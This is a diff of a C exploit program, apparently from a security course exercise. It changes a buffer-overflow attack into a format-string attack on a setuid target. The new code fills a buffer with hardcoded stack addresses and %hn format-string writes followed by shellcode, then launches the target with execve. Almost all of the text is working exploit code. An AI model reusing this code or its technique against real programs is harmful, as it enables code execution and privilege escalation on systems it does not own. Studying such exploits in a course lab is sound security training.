@@ -13,30 +13,16 @@
 
 
 int main(void) {
-    FILE *fp;
 	char *env[1];
     char *argv[4];
-    char argbuf[2009]; // 300 for buffer, 4 for ebp, 4 for eip
-    long buf_addr = 0xffbfdc70;
-    int i, len;
+    char argbuf[240] = {0}; // 300 for buffer, 4 for ebp, 4 for eip
+    char *ptr;
 
     // create the argbuf
-    strcpy(argbuf, shellcode);
-    // fill the argbuf with dot
-    len = strlen(argbuf);
-
-    for(i = len; i < 2000; i++){
-        argbuf[i] = '.';
-    }
-
-    strcpy(argbuf+500, "\x01\x02\x03\x04\x05\x06\x07\x08");
-
-    
-    // get the buffer location using gdb
-    //long buffer_addr = 0xffbfdb68;
-	// one way to invoke submit
-	//system(TARGET "\"Hello world!\"");
-
+    memset(argbuf, '.', sizeof(unsigned char)*240);
+    memcpy(argbuf, "\x9c\xdb\xbf\xff\x9e\xdb\xbf\xff%56284x%24$hn%9147x%25$hn\xff\xff\xff", 36);
+    ptr = argbuf + 36;
+    memcpy(ptr, shellcode, strlen(shellcode));
 	// another way
 	argv[0] = argbuf;
 	argv[1] = "-v"; 
@@ -47,8 +33,7 @@ int main(void) {
 
 	execve(TARGET, argv, env);
     fprintf(stderr, "execve failed\n");
-    
-	// execve only returns if it fails
+
 	
 	return 1;
 }
